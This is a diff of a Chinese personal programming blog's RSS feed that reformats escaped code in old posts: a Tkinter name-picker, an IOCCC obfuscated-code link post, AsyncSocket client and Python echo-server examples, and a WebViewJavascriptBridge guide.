-&lt;p&gt;# the length of name_list&lt;br /&gt;
-Len_List = 5&lt;/p&gt;
+# the length of name_list
+Len_List = 5
 
-&lt;p&gt;# delay time&lt;br /&gt;
-Delay_Time = 10&lt;br /&gt;
-delay_stop = 0&lt;br /&gt;
-stop_times = 10&lt;/p&gt;
+# delay time
+Delay_Time = 10
+delay_stop = 0
+stop_times = 10
 
-&lt;p&gt;# Label width&lt;br /&gt;
-label_width = 20&lt;br /&gt;
-class rp( Frame ):&lt;br /&gt;
-    def __init__(self):&lt;br /&gt;
-        Frame.__init__(self)&lt;br /&gt;
-        self.pack( expand = YES, fill = BOTH)&lt;br /&gt;
-        self.master.title(&quot;RP&quot;)&lt;br /&gt;
-        self.god = PhotoImage(file = &quot;01.gif&quot;)&lt;br /&gt;
-        self.label_1 = Label(self, image = self.god, font = (&quot;新宋体&quot;, size_title))&lt;br /&gt;
-        self.label_2 = Label(self, text = &quot;&quot;, font = (&quot;新宋体&quot;, size_title-4))&lt;br /&gt;
-        self.label_1.grid(row = 0, column = 0)&lt;br /&gt;
-        self.label_2.grid(row = 1, column = 0)&lt;/p&gt;
+# Label width
+label_width = 20
+class rp( Frame ):
+    def __init__(self):
+        Frame.__init__(self)
+        self.pack( expand = YES, fill = BOTH)
+        self.master.title(&amp;quot;RP&amp;quot;)
+        self.god = PhotoImage(file = &amp;quot;01.gif&amp;quot;)
+        self.label_1 = Label(self, image = self.god, font = (&amp;quot;新宋体&amp;quot;, size_title))
+        self.label_2 = Label(self, text = &amp;quot;&amp;quot;, font = (&amp;quot;新宋体&amp;quot;, size_title-4))
+        self.label_1.grid(row = 0, column = 0)
+        self.label_2.grid(row = 1, column = 0)
 
-&lt;p&gt;        self.button_start = Button(self, text = &quot;Start&quot;, font = (&quot;Comic Sans MS&quot;, size_button), command = self.start)&lt;br /&gt;
-        self.button_stop = Button(self, text = &quot;Stop&quot;, font = (&quot;Comic Sans MS&quot;, size_button), command = self.stop)&lt;br /&gt;
-        self.button_quit = Button(self, text = &quot;Exit&quot;, font = (&quot;Comic Sans MS&quot;, size_button), command = self.quit)&lt;/p&gt;
+        self.button_start = Button(self, text = &amp;quot;Start&amp;quot;, font = (&amp;quot;Comic Sans MS&amp;quot;, size_button), command = self.start)
+        self.button_stop = Button(self, text = &amp;quot;Stop&amp;quot;, font = (&amp;quot;Comic Sans MS&amp;quot;, size_button), command = self.stop)
+        self.button_quit = Button(self, text = &amp;quot;Exit&amp;quot;, font = (&amp;quot;Comic Sans MS&amp;quot;, size_button), command = self.quit)
 
-&lt;p&gt;        self.button_start.grid(row = row_button, column = col_button)&lt;br /&gt;
-        self.button_stop.grid(row = row_button, column = col_button+1)&lt;br /&gt;
-        self.button_quit.grid(row = row_button,column = col_button+2)&lt;/p&gt;
+        self.button_start.grid(row = row_button, column = col_button)
+        self.button_stop.grid(row = row_button, column = col_button+1)
+        self.button_quit.grid(row = row_button,column = col_button+2)
 
-&lt;p&gt;        self.name_list = [None] * Len_List&lt;br /&gt;
-        self.label_list = [None] * Len_List&lt;/p&gt;
+        self.name_list = [None] * Len_List
+        self.label_list = [None] * Len_List
 
-&lt;p&gt;        for i in range(Len_List):&lt;br /&gt;
-            global flag&lt;br /&gt;
-            self.name_list[i] = llist[i]&lt;br /&gt;
-            flag=(flag+1)%llist.__len__()&lt;br /&gt;
-        for i in range(Len_List):&lt;br /&gt;
-            if i == 2:&lt;br /&gt;
-                self.label_list[i] = Label(self, text = self.name_list[i], font = (&quot;新宋体&quot;, 30), background = (&quot;white&quot;), foreground = (&quot;blue&quot;), width = label_width)&lt;br /&gt;
-                self.label_list[i].grid(row = 2+i, column = 2)&lt;br /&gt;
-            else:&lt;br /&gt;
-                self.label_list[i] = Label(self, text = self.name_list[i], font = (&quot;新宋体&quot;, 30), width = label_width)&lt;br /&gt;
-                self.label_list[i].grid(row = 2+i, column = 2)&lt;br /&gt;
-    def _scroll_text(self):&lt;/p&gt;
+        for i in range(Len_List):
+            global flag
+            self.name_list[i] = llist[i]
+            flag=(flag+1)%llist.__len__()
+        for i in range(Len_List):
+            if i == 2:
+                self.label_list[i] = Label(self, text = self.name_list[i], font = (&amp;quot;新宋体&amp;quot;, 30), background = (&amp;quot;white&amp;quot;), foreground = (&amp;quot;blue&amp;quot;), width = label_width)
+                self.label_list[i].grid(row = 2+i, column = 2)
+            else:
+                self.label_list[i] = Label(self, text = self.name_list[i], font = (&amp;quot;新宋体&amp;quot;, 30), width = label_width)
+                self.label_list[i].grid(row = 2+i, column = 2)
+    def _scroll_text(self):
 
-&lt;p&gt;        global Delay_Time&lt;br /&gt;
-        global delay_stop&lt;br /&gt;
-        global stop_times&lt;br /&gt;
-        global flag&lt;br /&gt;
-        global llist&lt;/p&gt;
+        global Delay_Time
+        global delay_stop
+        global stop_times
+        global flag
+        global llist
 
-&lt;p&gt;        if stop_times == 0:&lt;br /&gt;
-            if self.after_id:&lt;br /&gt;
-                self.master.after_cancel(self.after_id)&lt;br /&gt;
-                self.after_id = None&lt;br /&gt;
-                return 0&lt;br /&gt;
-        flag=(flag+1)%llist.__len__()&lt;br /&gt;
-        self.line = llist[flag]&lt;/p&gt;
+        if stop_times == 0:
+            if self.after_id:
+                self.master.after_cancel(self.after_id)
+                self.after_id = None
+                return 0
+        flag=(flag+1)%llist.__len__()
+        self.line = llist[flag]
 
-&lt;p&gt;        self.name_list.pop(0)&lt;br /&gt;
-        self.name_list.append(self.line)&lt;br /&gt;
-        #sleep(0.2)&lt;br /&gt;
-        for i in range(Len_List):&lt;br /&gt;
-            #self.label_list[i].destroy()&lt;br /&gt;
-            #print self.name_list[i]&lt;br /&gt;
-            if i == 2:&lt;br /&gt;
-                self.label_list[i][&quot;text&quot;]=self.name_list[i]&lt;br /&gt;
-            else:&lt;br /&gt;
-                self.label_list[i][&quot;text&quot;]=self.name_list[i]&lt;/p&gt;
+        self.name_list.pop(0)
+        self.name_list.append(self.line)
+        #sleep(0.2)
+        for i in range(Len_List):
+            #self.label_list[i].destroy()
+            #print self.name_list[i]
+            if i == 2:
+                self.label_list[i][&amp;quot;text&amp;quot;]=self.name_list[i]
+            else:
+                self.label_list[i][&amp;quot;text&amp;quot;]=self.name_list[i]
 
-&lt;p&gt;        if delay_stop:&lt;br /&gt;
-            Delay_Time += 10&lt;br /&gt;
-            stop_times -= 1&lt;br /&gt;
-            self.after_id = self.master.after(Delay_Time, self._scroll_text)&lt;br /&gt;
-            if stop_times==0:&lt;br /&gt;
-#                print self.label_list[2][&quot;text&quot;]&lt;br /&gt;
-#                for i in llist:&lt;br /&gt;
-#                    print i.decode(&#39;UTF-8&#39;)&lt;br /&gt;
-                llist.remove(self.label_list[2][&quot;text&quot;].encode(&#39;utf-8&#39;))&lt;br /&gt;
-        else:&lt;br /&gt;
-            self.after_id = self.master.after(Delay_Time, self._scroll_text)&lt;/p&gt;
+        if delay_stop:
+            Delay_Time += 10
+            stop_times -= 1
+            self.after_id = self.master.after(Delay_Time, self._scroll_text)
+            if stop_times==0:
+#                print self.label_list[2][&amp;quot;text&amp;quot;]
+#                for i in llist:
+#                    print i.decode(&amp;#39;UTF-8&amp;#39;)
+                llist.remove(self.label_list[2][&amp;quot;text&amp;quot;].encode(&amp;#39;utf-8&amp;#39;))
+        else:
+            self.after_id = self.master.after(Delay_Time, self._scroll_text)
 
-&lt;p&gt;    def start(self):&lt;br /&gt;
-        global delay_stop&lt;br /&gt;
-        global stop_times&lt;br /&gt;
-        global Delay_Time&lt;br /&gt;
-        delay_stop = 0&lt;br /&gt;
-        stop_times = 10&lt;br /&gt;
-        Delay_Time = 10&lt;br /&gt;
-        self.after_id = self.master.after(Delay_Time, self._scroll_text)&lt;/p&gt;
+    def start(self):
+        global delay_stop
+        global stop_times
+        global Delay_Time
+        delay_stop = 0
+        stop_times = 10
+        Delay_Time = 10
+        self.after_id = self.master.after(Delay_Time, self._scroll_text)
 
-&lt;p&gt;    def stop(self):&lt;br /&gt;
-        global delay_stop&lt;br /&gt;
-        delay_stop = 1&lt;/p&gt;
+    def stop(self):
+        global delay_stop
+        delay_stop = 1
 
-&lt;p&gt;    def quit(self):&lt;br /&gt;
-        sys.exit(0)&lt;/p&gt;
+    def quit(self):
+        sys.exit(0)
 
-&lt;p&gt;app = rp()&lt;br /&gt;
+app = rp()
 app.mainloop()
-&amp;lt;/pre&amp;gt;&lt;/p&gt;
-</description>
+&amp;amp;lt;/pre&amp;amp;gt;
+&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
                 <link>http://snorlaxzxz.com/program/2012/10/16/%E4%B8%80%E4%B8%AA%E9%9D%9E%E5%B8%B8%E7%AE%80%E6%98%93%E7%9A%84%E9%9A%8F%E6%9C%BA%E9%80%89%E7%9A%84%E5%B0%8F%E7%A8%8B%E5%BA%8F</link>
                 <guid>http://snorlaxzxz.com/program/2012/10/16/一个非常简易的随机选的小程序</guid>
                 <pubDate>2012-10-16T00:00:00+08:00</pubDate>
@@ -2905,18 +2860,20 @@ app.mainloop()
 
         <item>
                 <title>有趣的混乱代码</title>
-                <description>&lt;p&gt;&lt;pre&gt;无意间看到一个第20届国际C语言混乱代码大赛（IOCCC）的最佳作品，同样作为死宅对他的作品也更加是喜欢了，于是乎我就来分享下这段代码。&lt;/pre&gt;&lt;/p&gt;
+                <description>&lt;p&gt;&lt;p&gt;
+```
+无意间看到一个第20届国际C语言混乱代码大赛（IOCCC）的最佳作品，同样作为死宅对他的作品也更加是喜欢了，于是乎我就来分享下这段代码。&lt;/p&gt;
 
-&lt;p&gt;这是一段典型的自功自受啊，把自己当成输入，成为输出后再继续当输入= =&lt;br /&gt;
-源文件
-&lt;a href=&quot;http://snorlax-wordpress.stor.sinaapp.com/uploads/2012/04/akiri1.png&quot;&gt;&lt;img class=&quot;alignnone size-full wp-image-42&quot; title=&quot;akiri1&quot; src=&quot;http://snorlax-wordpress.stor.sinaapp.com/uploads/2012/04/akiri1.png&quot; alt=&quot;&quot; width=&quot;106&quot; height=&quot;123&quot; /&gt;&lt;/a&gt;
-&lt;a href=&quot;http://snorlax-wordpress.stor.sinaapp.com/uploads/2012/04/akiri2.png&quot;&gt;&lt;img class=&quot;alignnone size-medium wp-image-43&quot; title=&quot;akiri2&quot; src=&quot;http://snorlax-wordpress.stor.sinaapp.com/uploads/2012/04/akiri2-288x300.png&quot; alt=&quot;&quot; width=&quot;288&quot; height=&quot;300&quot; /&gt;&lt;/a&gt;
-&lt;pre&gt;&lt;a href=&quot;http://snorlax-wordpress.stor.sinaapp.com/uploads/2012/04/akiri4.png&quot; /&gt;&lt;/pre&gt;&lt;img class=&quot;alignnone size-medium wp-image-45&quot; title=&quot;akiri4&quot; src=&quot;http://snorlax-wordpress.stor.sinaapp.com/uploads/2012/04/akiri4-294x300.png&quot; alt=&quot;&quot; width=&quot;294&quot; height=&quot;300&quot; /&gt;
-&lt;pre&gt;&lt;a href=&quot;http://snorlax-wordpress.stor.sinaapp.com/uploads/2012/04/akiri3.png&quot; /&gt;&lt;/pre&gt;&lt;img class=&quot;alignnone size-full wp-image-44&quot; title=&quot;akiri3&quot; src=&quot;http://snorlax-wordpress.stor.sinaapp.com/uploads/2012/04/akiri3.png&quot; alt=&quot;&quot; width=&quot;164&quot; height=&quot;172&quot; /&gt;
-&lt;pre&gt;再迭代下去就阿卡林就变型的完全看不出了。。&lt;/pre&gt;
-&lt;pre&gt;akari源码地址：http://www.ioccc.org/2011/akari/akari.c&lt;/pre&gt;&lt;/p&gt;
+&lt;p&gt;这是一段典型的自功自受啊，把自己当成输入，成为输出后再继续当输入= =
+源文件&lt;/p&gt;
 
-&lt;p&gt;作者其它作品地址：http://uguu.org/sources.html&lt;/p&gt;
+&lt;p&gt;再迭代下去就阿卡林就变型的完全看不出了。。
+akari源码地址：&lt;a href=&quot;http://www.ioccc.org/2011/akari/akari.c&quot;&gt;http://www.ioccc.org/2011/akari/akari.c&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;作者其它作品地址：&lt;a href=&quot;http://uguu.org/sources.html&quot;&gt;http://uguu.org/sources.html&lt;/a&gt;&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;/blockquote&gt;
 </description>
                 <link>http://snorlaxzxz.com/program/2012/04/24/%E6%9C%89%E8%B6%A3%E7%9A%84%E6%B7%B7%E4%B9%B1%E4%BB%A3%E7%A0%81</link>
                 <guid>http://snorlaxzxz.com/program/2012/04/24/有趣的混乱代码</guid>
@@ -2937,72 +2894,72 @@ app.mainloop()
                 <description>&lt;p&gt;&lt;a href=&quot;https://snorlax.sinaapp.com/Document_Code/AsyncSocket.h&quot;&gt;AsyncSocket.h&lt;/a&gt;
 &lt;a href=&quot;https://snorlax.sinaapp.com/Document_Code/AsyncSocket.m&quot;&gt;AsyncSocket.m&lt;/a&gt;&lt;/p&gt;
 
-&lt;p&gt;&lt;pre lang=&quot;objective-c&quot;&gt;
-- (BOOL)connectToHost:(NSString*)hostname onPort:(UInt16)port error:(NSError **)errPtr //connect to the server&lt;/pre&gt;&lt;/p&gt;
+&lt;p&gt;&lt;p&gt;
+```&lt;/p&gt;
 
-&lt;p&gt;- (void)writeData:(NSData *)data withTimeout:(NSTimeInterval)timeout tag:(long)tag //send data&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;p&gt;(BOOL)connectToHost:(NSString*)hostname onPort:(UInt16)port error:(NSError **)errPtr //connect to the server&lt;/p&gt;&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;(void)writeData:(NSData *)data withTimeout:(NSTimeInterval)timeout tag:(long)tag //send data&lt;/p&gt;&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;(void)onSocket:(AsyncSocket *)sock didReadData:(NSData *)data withTag:(long)tag //be called when the data was received&lt;/p&gt;&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;(void)onSocketDidDisconnect:(AsyncSocket *)sock //be called when the socket disconnect&lt;/p&gt;&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;(void)onSocketDidSecure:(AsyncSocket *)sock // be called when TLS is unstable&lt;/p&gt;&lt;/li&gt;
+&lt;/ul&gt;
 
-&lt;p&gt;- (void)onSocket:(AsyncSocket *)sock didReadData:(NSData *)data withTag:(long)tag //be called when the data was received&lt;/p&gt;
+&lt;p&gt;Example client&lt;/p&gt;
 
-&lt;p&gt;- (void)onSocketDidDisconnect:(AsyncSocket *)sock //be called when the socket disconnect&lt;/p&gt;
-
-&lt;p&gt;- (void)onSocketDidSecure:(AsyncSocket *)sock // be called when TLS is unstable
-&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;Example client&lt;/strong&gt;
-&lt;pre lang=&quot;objective-c&quot;&gt;
-AsyncSocket *client;
+&lt;p&gt;AsyncSocket *client;
 NSSError *err=nil;
-NSString *hel=@&quot;hello AsyncSocket!&quot;; 
+NSString *hel=@&amp;quot;hello AsyncSocket!&amp;quot;; 
 NSData *data = [hel dataUsingEncoding:NSISOLatin1StringEncoding];
-[client connectToHost:@&quot;127.0.0.1&quot; onPort:51423 error:&amp;err];
+[client connectToHost:@&amp;quot;127.0.0.1&amp;quot; onPort:51423 error:&amp;amp;err];
 [client writeData:data withTimeout:-1 tag:0];
-- (void)onSocket:(AsyncSocket *)sock didReadData:(NSData *)data withTag:(long)tag{  
-    
-    NSString* aStr = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];  
-    NSLog(@&quot;Hava received datas is :%@&quot;,aStr);  
-    [aStr release];  
-    [client readDataWithTimeout:-1 tag:0];  
-} 
-&lt;/pre&gt;
-&lt;strong&gt;Example server&lt;/strong&gt;
-&lt;pre lang=&quot;python&quot;&gt;
-import socket
-host=&#39;&#39;
+- (void)onSocket:(AsyncSocket *)sock didReadData:(NSData *)data withTag:(long)tag{  &lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;NSString* aStr = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];  
+NSLog(@&amp;quot;Hava received datas is :%@&amp;quot;,aStr);  
+[aStr release];  
+[client readDataWithTimeout:-1 tag:0];  
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;} &lt;/p&gt;
+
+&lt;p&gt;Example server&lt;/p&gt;
+
+&lt;p&gt;import socket
+host=&amp;#39;&amp;#39;
 port=51423
 s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
 s.bind((host,port))
-s.listen(1)&lt;/pre&gt;&lt;/p&gt;
+s.listen(1)&lt;/p&gt;
 
-&lt;p&gt;print &quot;server is running on port %d;press ctrl-c to terminate&quot;&lt;br /&gt;
-while 1:&lt;br /&gt;
-    try:&lt;br /&gt;
-        clientsock, clientaddr = s.accept()&lt;br /&gt;
-    except KeyboardInterrupt:&lt;br /&gt;
-        raise&lt;br /&gt;
-    except:&lt;br /&gt;
-        traceback.print_exc()&lt;br /&gt;
-        continue&lt;br /&gt;
-    try:&lt;br /&gt;
-        print &quot;Got connection from&quot;, clientsock.getpeername()&lt;br /&gt;
-        while 1:&lt;br /&gt;
-            data = clientsock.recv(4096)&lt;br /&gt;
-            if not len(data):&lt;br /&gt;
-                break&lt;br /&gt;
-            clientsock.sendall(data)&lt;br /&gt;
-    except (KeyboardInterrupt, SystemExit):&lt;br /&gt;
-        raise&lt;br /&gt;
-    except:&lt;br /&gt;
-        traceback.print_exc()&lt;br /&gt;
-    try:&lt;br /&gt;
-        clientsock.close()&lt;br /&gt;
-    except KeyboardInterrupt:&lt;br /&gt;
-        raise&lt;br /&gt;
-    except:&lt;br /&gt;
+&lt;p&gt;print &amp;quot;server is running on port %d;press ctrl-c to terminate&amp;quot;
+while 1:
+    try:
+        clientsock, clientaddr = s.accept()
+    except KeyboardInterrupt:
+        raise
+    except:
+        traceback.print_exc()
+        continue
+    try:
+        print &amp;quot;Got connection from&amp;quot;, clientsock.getpeername()
+        while 1:
+            data = clientsock.recv(4096)
+            if not len(data):
+                break
+            clientsock.sendall(data)
+    except (KeyboardInterrupt, SystemExit):
+        raise
+    except:
+        traceback.print_exc()
+    try:
+        clientsock.close()
+    except KeyboardInterrupt:
+        raise
+    except:
         traceback.print_exc()&lt;/p&gt;
 
-&lt;p&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;/blockquote&gt;
 </description>
                 <link>http://snorlaxzxz.com/program/2012/03/18/%E5%BC%80%E6%BA%90%E5%BA%93asyncsocket%E5%AE%9E%E7%8E%B0socket%E9%80%9A%E4%BF%A1%E7%9A%84%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95</link>
                 <guid>http://snorlaxzxz.com/program/2012/03/18/开源库asyncsocket实现socket通信的基本用法</guid>
@@ -3014,53 +2971,53 @@ while 1:&lt;br /&gt;
                 <description>&lt;p&gt;&lt;a href=&quot;https://github.com/marcuswestin/WebViewJavascriptBridge&quot;&gt;marcuswestin / WebViewJavascriptBridge&lt;/a&gt;
 &lt;strong&gt;1) Copy Classes/WebViewJavascriptBridge.h and Classes/WebViewJavascriptBridge.m into your Xcode project&lt;/strong&gt;&lt;/p&gt;
 
-&lt;p&gt;&lt;strong&gt;2) Instantiate a UIWebView, a WebViewJavascriptBridge, and set yourself as the bridge&#39;s delegate&lt;/strong&gt;
-&lt;pre lang=&quot;objective-c&quot;&gt;
-   #import &lt;UIKit/UIKit.h&gt;
-#import &quot;WebViewJavascriptBridge.h&quot;&lt;/pre&gt;&lt;/p&gt;
+&lt;p&gt;&lt;p&gt;&lt;strong&gt;2) Instantiate a UIWebView, a WebViewJavascriptBridge, and set yourself as the bridge&amp;#39;s delegate&lt;/strong&gt;&lt;/p&gt;
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;   #import 
+#import &amp;quot;WebViewJavascriptBridge.h&amp;quot;
 
-&lt;p&gt;@interface ExampleAppDelegate : UIResponder &lt;UIApplicationDelegate, WebViewJavascriptBridgeDelegate&gt;&lt;/p&gt;
+@interface ExampleAppDelegate : UIResponder 
 
-&lt;p&gt;@end&lt;/p&gt;
+@end
 
-&lt;p&gt;@implementation ExampleAppDelegate&lt;/p&gt;
+@implementation ExampleAppDelegate
 
-&lt;p&gt;- (BOOL)application:(UIApplication *)application didFinishLaunchingWithOptions:(NSDictionary *)launchOptions&lt;br /&gt;
+- (BOOL)application:(UIApplication *)application didFinishLaunchingWithOptions:(NSDictionary *)launchOptions
 {
-    self.window = [[UIWindow alloc] initWithFrame:[[UIScreen mainScreen] bounds]];&lt;/p&gt;
+    self.window = [[UIWindow alloc] initWithFrame:[[UIScreen mainScreen] bounds]];
 
-&lt;p&gt;    self.webView = [[UIWebView alloc] initWithFrame:self.window.bounds];&lt;br /&gt;
-    [self.window addSubview:webView];&lt;br /&gt;
-    self.javascriptBridge = [WebViewJavascriptBridge javascriptBridgeWithDelegate:self];&lt;br /&gt;
-    self.webView.delegate = javascriptBridge;&lt;/p&gt;
+    self.webView = [[UIWebView alloc] initWithFrame:self.window.bounds];
+    [self.window addSubview:webView];
+    self.javascriptBridge = [WebViewJavascriptBridge javascriptBridgeWithDelegate:self];
+    self.webView.delegate = javascriptBridge;
 
-&lt;p&gt;    [self.window makeKeyAndVisible];&lt;br /&gt;
-    return YES;&lt;br /&gt;
-}&lt;/p&gt;
+    [self.window makeKeyAndVisible];
+    return YES;
+}
 
-&lt;p&gt;- (void)javascriptBridge:(WebViewJavascriptBridge *)bridge receivedMessage:(NSString *)message fromWebView:(UIWebView *)webView &lt;br /&gt;
+- (void)javascriptBridge:(WebViewJavascriptBridge *)bridge receivedMessage:(NSString *)message fromWebView:(UIWebView *)webView 
 {
-    NSLog(@&quot;MyJavascriptBridgeDelegate received message: %@&quot;, message);&lt;br /&gt;
-}&lt;/p&gt;
+    NSLog(@&amp;quot;MyJavascriptBridgeDelegate received message: %@&amp;quot;, message);
+}
 
-&lt;p&gt;@end
+@end
 
-&lt;strong&gt;3) Go ahead and send some messages from Objc to javascript&lt;/strong&gt;&lt;/p&gt;
+3) Go ahead and send some messages from Objc to javascript
 
-&lt;p&gt;&lt;pre lang=&quot;objective-c&quot;&gt;
-[self.javascriptBridge sendMessage:@&quot;Well hello there&quot; toWebView:self.webView];
-&lt;/pre&gt;&lt;/p&gt;
 
-&lt;p&gt;&lt;strong&gt;4) Finally, set up the javascript side of things&lt;/strong&gt;
-&lt;pre lang=&quot;objective-c&quot;&gt;
-document.addEventListener(&#39;WebViewJavascriptBridgeReady&#39;, function onBridgeReady() {
+[self.javascriptBridge sendMessage:@&amp;quot;Well hello there&amp;quot; toWebView:self.webView];
+
+
+4) Finally, set up the javascript side of things
+
+document.addEventListener(&amp;#39;WebViewJavascriptBridgeReady&amp;#39;, function onBridgeReady() {
     WebViewJavascriptBridge.setMessageHandler(function(message) {
-        alert(&#39;Received message: &#39; + message)
+        alert(&amp;#39;Received message: &amp;#39; + message)
     })
-    WebViewJavascriptBridge.sendMessage(&#39;Hello from the javascript&#39;)
+    WebViewJavascriptBridge.sendMessage(&amp;#39;Hello from the javascript&amp;#39;)
 }, false)
-&lt;/pre&gt;&lt;/p&gt;
-</description>
+
+&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
                 <link>http://snorlaxzxz.com/program/2012/03/14/%E5%88%86%E4%BA%AB%E4%B8%80%E4%B8%AAwebview%E5%92%8Cjs%E4%BA%A4%E4%BA%92%E7%9A%84%E5%B0%81%E8%A3%85</link>
                 <guid>http://snorlaxzxz.com/program/2012/03/14/分享一个webview和js交互的封装</guid>
                 <pubDate>2012-03-14T00:00:00+08:00</pubDate>
@@ -3077,16 +3034,11 @@ document.addEventListener(&#39;WebViewJavascriptBridgeReady&#39;, function onBri
 
         <item>
                 <title>test CodeBox</title>
-                <description>&lt;p&gt;&lt;pre lang=&quot;php&quot;&gt;
-    &lt;?php
-      function foo() {
-        echo &quot;Hello World!\n&quot;;
-      }
-      for ($i = 0; $i &lt; 10 $i++) {
-        foo();
-      }
-    ?&gt;
-&lt;/pre&gt;&lt;/p&gt;
+                <description>&lt;p&gt;&lt;p&gt;
+```&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;/blockquote&gt;
 </description>
                 <link>http://snorlaxzxz.com/program/2012/03/13/test-codebox</link>
                 <guid>http://snorlaxzxz.com/program/2012/03/13/test-codebox</guid>
